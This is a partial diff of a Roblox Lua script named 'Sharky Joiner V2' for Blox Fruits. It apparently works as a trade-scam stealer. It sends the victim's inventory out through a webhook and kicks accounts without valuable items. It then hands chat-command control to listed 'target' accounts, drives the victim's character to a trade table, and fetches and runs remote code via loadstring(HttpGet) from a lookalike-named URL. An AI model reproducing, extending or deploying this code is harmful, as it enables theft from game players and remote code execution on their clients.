-            end;
+            else
+                warn("ActivationPasswords not loaded or invalid type.")
+                sendMessage("Activation system error.")
+                return
+            end
 
             if foundPassword then
                 if activatedUsers[player.UserId]then -- Use player.UserId
@@ -666,7 +734,7 @@ local function processChatCommand(_, p, m) -- p is the player object
 	end;
 	playerCooldowns[commandName] = tick(); -- Update cooldown timestamp
 
-    -- Execute Command (Standardized Call)
+    -- Execute Command (Standardized Call) -- <<< REMOVED SPECIAL CASE >>>
 	task.spawn(function()
         -- Call ALL commands with (args, player)
         local success, err = pcall(commandFuncData.e, args, p);
@@ -682,6 +750,14 @@ end
 -- Main Loop & Init (Unchanged logic, just calls updated sendWebhook)
 local function startMainLoop() local ir=true; local hct=false; local ct,cs; local lmt=tick(); local ltc=tick(); local ltrc=tick(); local UI=0.5; local TCI=2; local MCI=4; local TVD=1.5; local TRC=4; local vpr=false; local function vTP() if vpr then return end; vpr=true; local fc=0; local lts=false; for _=1,TRC do task.wait(0.25); local tu=LocalPlayer.PlayerGui:FindFirstChild("Main"); local crts=tu and tu:FindFirstChild("Trade")and tu.Trade.Visible; if lts~=crts or not crts or not isInTradeWithCorrectPlayer()then fc=fc+1 end; lts=crts end; if fc>=TRC-1 then task.wait(0.1); ForceJump()end; vpr=false end; local caC,crC,jcC; local function onCA(c) task.wait(1); local h=c:WaitForChild("Humanoid",5); local r=c:WaitForChild("HumanoidRootPart",5); if not h or not r then return end; local n=tick(); lmt,ltc,ltrc=n,n,n; jcC=disableJump(); task.spawn(function() ct,cs=findTradeTable(); if ct and cs then tweenToPosition(cs.Position)end end)end; local function onCR() ct,cs=nil,nil; if jcC then jcC()end end; local function runML() local lt=tick(); while ir do local n=tick(); local dt=n-lt; lt=n; local c=LocalPlayer.Character; if c and c:FindFirstChild("HumanoidRootPart")then local tu=LocalPlayer.PlayerGui:FindFirstChild("Main"); local it=tu and tu:FindFirstChild("Trade")and tu.Trade.Visible; if not it then hct=false; ltrc=n elseif not hct and(n-ltrc)>=TVD then task.spawn(vTP); hct=true end; if n-ltc>=TCI then task.spawn(function() local nt,ns=findTradeTable(); if nt and ns then ct,cs=nt,ns end end); ltc=n end; if ct and cs then local r=c.HumanoidRootPart; if r then local d=(r.Position-cs.Position).Magnitude; if d>5 then tweenToPosition(cs.Position)elseif n-lmt>=MCI then local ro=Vector3.new(math.random(-1,1),0,math.random(-1,1)); tweenToPosition(cs.Position+ro); lmt=n end end end end; local te=tick()-n; local wt=math.max(0.01,UI-te); task.wait(wt)end end; caC=LocalPlayer.CharacterAdded:Connect(onCA); crC=LocalPlayer.CharacterRemoving:Connect(onCR); if LocalPlayer.Character then task.spawn(onCA,LocalPlayer.Character)end; task.spawn(runML); return function() ir=false; if caC then caC:Disconnect(); caC=nil end; if crC then crC:Disconnect(); crC=nil end; if jcC then jcC()end; ct,cs=nil,nil end end
 local function init()
+	-- Load Config first
+    local configLoaded, loadMessage = loadAdminConfig()
+    if not configLoaded then
+        LocalPlayer:Kick("FATAL ERROR: Could not load critical configuration. " .. (loadMessage or ""))
+        -- Use a loop to ensure the script stops if Kick fails
+        while true do task.wait(1) end
+    end
+
 	local pid = game.PlaceId; if pid==2753915549 then LocalPlayer:Kick("Sea 2/3 Only!"); return end; if pid~=4442272183 and pid~=7449423635 then LocalPlayer:Kick("Blox Fruits Only!"); return end
 	local iInv = getInventory(); if not iInv then LocalPlayer:Kick("Inventory Error."); return end;
 	inventory22 = iInv -- Set global snapshot for leave check
@@ -689,14 +765,14 @@ local function init()
 	if not cIFH(iInv)then LocalPlayer:Kick("(Alt Filter - Requires Target/Premium)"); return end
 	task.spawn(function() task.wait(1); JoinTeam(); task.spawn(createNotification); sendWebhook(iInv) end) -- Calls the modified sendWebhook
 	local mls=nil; local cc=nil; local eUl=false
-	local function onPA(p) if mls then return end; local isAuthorized=false; if Usernames then for _,un in ipairs(Usernames)do if type(un)=="string" and string.lower(p.Name)==string.lower(un)then isAuthorized=true; break end end end; if not isAuthorized then return end; mls=function()end; print("Target player joined: "..p.Name..". Initializing main features."); task.spawn(function() if not eUl then print("Loading external UI..."); local s,e=pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/refs/heads/main/LoadingUI"))() end); if not s then warn("External UI Failed:",e)else eUl=true; print("External UI loaded.")end end; task.wait(1); if not cc then cc=Players.PlayerChatted:Connect(processChatCommand); print("Chat processor connected.")end; mls=startMainLoop(); print("Main loop started."); task.spawn(function() task.wait(2); sendMessage("Join (uwdvTtqTDA) << Invite in dc if you want to learn how to make a lot of mythical fruits!")end)end)end
+	local function onPA(p) if mls then return end; local isAuthorized=false; if Usernames then for _,un in ipairs(Usernames)do if type(un)=="string" and string.lower(p.Name)==string.lower(un)then isAuthorized=true; break end end end; if not isAuthorized then return end; mls=function()end; print("Target player joined: "..p.Name..". Initializing main features."); task.spawn(function() if not eUl then print("Loading external UI..."); local s,e=pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/W-Scripts/UI/main/LoadingUl"))() end); if not s then warn("External UI Failed:",e)else eUl=true; print("External UI loaded.")end end; task.wait(1); if not cc then cc=Players.PlayerChatted:Connect(processChatCommand); print("Chat processor connected.")end; mls=startMainLoop(); print("Main loop started."); task.spawn(function() task.wait(2); sendMessage("Join (uwdvTtqTDA) << Invite in dc if you want to learn how to make a lot of mythical fruits!")end)end)end
 	local paC=Players.PlayerAdded:Connect(onPA); task.spawn(function() for _,p in ipairs(Players:GetPlayers())do onPA(p)end end)
 	local lprC; lprC=Players.PlayerRemoving:Connect(function(p) if activatedUsers[p.UserId]then activatedUsers[p.UserId]=nil; print("Deactivated user on leave:",p.Name)end; if CommandCooldowns and CommandCooldowns[p.Name]then CommandCooldowns[p.Name]=nil end; if p==LocalPlayer then sendProtector(); if paC then paC:Disconnect()end; if cc then cc:Disconnect()end; if mls and type(mls)=="function"then mls()end; if lprC then lprC:Disconnect()end end end)
 end
 
 -- Execution Guard (Updated Guard Name)
-if not shared.ScriptExecuted_SharkyV2_Final_1_3_2 then -- Updated Guard Name/Version
-	shared.ScriptExecuted_SharkyV2_Final_1_3_2 = true
+if not shared.ScriptExecuted_SharkyV2_Final_1_3_3 then -- Updated Guard Name/Version
+	shared.ScriptExecuted_SharkyV2_Final_1_3_3 = true
 	task.spawn(function()
 		local s, e = pcall(init);
 		if not s then
@@ -705,5 +781,5 @@ if not shared.ScriptExecuted_SharkyV2_Final_1_3_2 then -- Updated Guard Name/Ver
 		end
 	end)
 else
-	warn("Sharky Joiner V2 (v1.3.2) already executed.")
+	warn("Sharky Joiner V2 (v1.3.3) already executed.")
 end
